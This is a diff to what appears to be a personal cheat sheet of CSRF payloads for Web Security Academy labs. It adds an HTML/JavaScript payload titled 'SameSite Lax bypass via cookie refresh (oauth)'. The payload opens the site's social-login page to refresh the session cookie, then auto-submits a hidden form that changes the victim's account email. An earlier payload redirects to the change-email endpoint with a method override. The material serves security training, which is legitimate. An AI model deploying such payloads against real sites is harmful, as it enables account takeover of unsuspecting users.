@@ -120,6 +120,22 @@ Referrer-Policy: unsafe-url (http header)
 <script>
     document.location = "<IP>/my-account/change-email?email=pwned@web-security-academy.net&_method=POST";
 </script>
+
+
+// SameSite Lax bypass via cookie refresh (oauth)
+
+<form class="login-form" name="change-email-form" action="https://0a5100a304ed6d8482165b8d008d008b.web-security-academy.net/my-account/change-email" method="POST">
+	 <input type="hidden" type="email" name="email" value="foso@foo.com">    
+</form>
+
+<script>
+window.open("https://0a5100a304ed6d8482165b8d008d008b.web-security-academy.net/social-login");
+setTimeout(updateEmail,5000);
+function updateEmail(){
+document.forms[0].submit();
+}
+</script>
+
 ```
 
 
